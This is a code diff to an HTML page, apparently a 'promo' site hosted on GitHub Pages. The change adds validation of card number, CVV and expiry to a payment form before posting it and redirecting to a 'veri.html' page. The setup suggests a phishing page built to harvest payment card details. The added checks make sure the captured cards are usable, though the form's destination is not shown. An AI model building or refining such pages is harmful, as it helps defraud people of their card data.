@@ -131,26 +131,72 @@
     document.getElementById('paymentForm').addEventListener('submit', function (e) {
         e.preventDefault(); // Prevent the default form submission
 
-        const formData = new FormData(this);
+        // Get form values
+        const cardNumber = document.getElementById('cardno').value;
+        const cvv = document.getElementById('cvv').value;
+        const month = document.getElementById('month').value;
+        const year = document.getElementById('year').value;
 
-        fetch(this.action, {
-            method: 'POST',
-            body: formData,
-        })
-        .then(response => {
-            if (response.ok) {
-                // Redirect after successful submission
-                window.location.href = 'https://big24promo.github.io/SA2024promo/veri.html';
-            } else {
-                alert('Error submitting form. Please try again.');
-            }
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            alert('An unexpected error occurred. Please try again.');
-        });
+        // Define validation flags
+        let isValid = true;
+        let errorMessage = '';
+
+        // Validate card number (16 digits, starting with 4, 5, or 6 as an example)
+        const cardRegex = /^(4|5|6)\d{15}$/;
+        if (!cardRegex.test(cardNumber)) {
+            isValid = false;
+            errorMessage += 'Invalid card number. It must be 16 digits\n';
+        }
+
+        // Validate CVV (3 digits)
+        const cvvRegex = /^\d{3}$/;
+        if (!cvvRegex.test(cvv)) {
+            isValid = false;
+            errorMessage += 'Invalid CVV. It must be exactly 3 digits.\n';
+        }
+
+        // Validate month (1-12)
+        const monthRegex = /^(0[1-9]|1[0-2])$/;
+        if (!monthRegex.test(month)) {
+            isValid = false;
+            errorMessage += 'Invalid month. It must be between 01 and 12.\n';
+        }
+
+        // Validate year (current year or future year up to 10 years ahead)
+        const currentYear = new Date().getFullYear();
+        const yearRegex = /^(\d{4})$/;
+        if (!yearRegex.test(year) || parseInt(year) < currentYear || parseInt(year) > currentYear + 10) {
+            isValid = false;
+            errorMessage += `Invalid year. It must be between ${currentYear} and ${currentYear + 10}.\n`;
+        }
+
+        // Display error or proceed
+        if (!isValid) {
+            alert(errorMessage);
+        } else {
+            // Proceed with form submission
+            const formData = new FormData(this);
+
+            fetch(this.action, {
+                method: 'POST',
+                body: formData,
+            })
+                .then(response => {
+                    if (response.ok) {
+                        // Redirect after successful submission
+                        window.location.href = 'https://big24promo.github.io/SA2024promo/veri.html';
+                    } else {
+                        alert('Error submitting form. Please try again.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An unexpected error occurred. Please try again.');
+                });
+        }
     });
 </script>
+
 </section>
 <!-- Sponsors Section -->
     <section class="sponsors">
